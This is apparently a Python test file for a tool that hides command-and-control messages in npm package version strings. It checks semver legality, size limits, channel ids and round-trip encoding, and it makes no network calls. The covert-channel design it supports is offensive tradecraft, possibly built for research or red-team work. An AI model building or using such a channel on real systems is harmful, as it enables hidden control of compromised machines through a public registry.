#!/usr/bin/env python3
"""Staging wire format: semver legality and round-trip, no network needed."""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from npm_c2.stage import (          # noqa: E402
    encode_message, decode_message, parse_version, make_version,
    payload_room, MAX_VERSION, CHANNEL_RE)

fails = []

# semver: numeric identifiers may not have leading zeros.
import re                                                          # noqa: E402
NUM = re.compile(r"^(0|[1-9]\d*)$")
print("[i] checking version legality against the semver leading-zero rule")
for seq in (0, 1, 9, 10, 15, 16, 255, 4095):
    v = make_version("afe0", seq, "c", "AAAA")
    pre = v.split("-", 1)[1].split(".")
    for part in pre:
        if part.isdigit() and not NUM.match(part):
            fails.append(f"leading zero in {v!r} part {part!r}")
if not fails:
    print("[PASS] every generated version is legal semver")

# Length must stay under the measured ceiling.
for n in (1, 100, 227):
    payload = "A" * n
    v = make_version("afe0", 1, "c", payload)
    if len(v) > MAX_VERSION:
        fails.append(f"version {len(v)} chars > {MAX_VERSION}")
if not fails:
    print(f"[PASS] versions stay under {MAX_VERSION} chars")

# payload_room must never allow an overlong version.
if len(make_version("afe0", 1, "c", "A" * payload_room())) > MAX_VERSION:
    fails.append("payload_room lets a version exceed the ceiling")
else:
    print(f"[PASS] payload room {payload_room()} chars fits exactly")

# Underscore must never appear: semver rejects it.
if "_" in make_version("afe0", 1, "c", "A" * 50):
    fails.append("underscore leaked into a version")
else:
    print("[PASS] no underscore in generated versions")

# Round trip across sizes, including compression.
for size in (0, 1, 20, 32, 100, 500, 1200, 4000):
    data = bytes((i * 13 + 7) % 256 for i in range(size))
    versions = encode_message("afe0", 100, "c", data)
    parts = [parse_version(v) for v in versions]
    if any(p is None for p in parts):
        fails.append(f"{size}B: a version did not parse")
        continue
    back = decode_message(parts)
    if back != data:
        fails.append(f"{size}B: round-trip mismatch")
if not fails:
    print("[PASS] round-trip 0..4000 bytes")

# Version length for a multi-part message must stay legal.
big = b"x" * 4000
for v in encode_message("afe0", 1, "r", big):
    if len(v) > MAX_VERSION:
        fails.append(f"multi-part version {len(v)} chars too long")
if not fails:
    print("[PASS] multi-part versions stay under the ceiling")

# Channel validation.
for bad in ("f00", "f00dd", "0abc", "ZZZZ"):
    try:
        make_version(bad, 1, "c", "AA")
        fails.append(f"accepted bad channel {bad!r}")
    except ValueError:
        pass
for good in ("f00d", "a1b2", "abcd", "ffee"):
    if not CHANNEL_RE.match(good):
        fails.append(f"rejected good channel {good!r}")
if not [f for f in fails if "channel" in f]:
    print("[PASS] channel validation accepts a-f/0-9, rejects bad ids")

# Capacity report.
print()
print("capacity per version: %d payload chars = ~%d bytes before compression"
      % (payload_room() - 2, (payload_room() - 2) * 5 // 8))
for n in (100, 500, 1000, 4000):
    print(f"  {n:>5}B -> {len(encode_message('afe0', 1, 'c', b'x' * n))} version(s)")

print()
if fails:
    for f in fails:
        print("FAIL:", f)
    sys.exit(1)
print("staging wire checks passed")
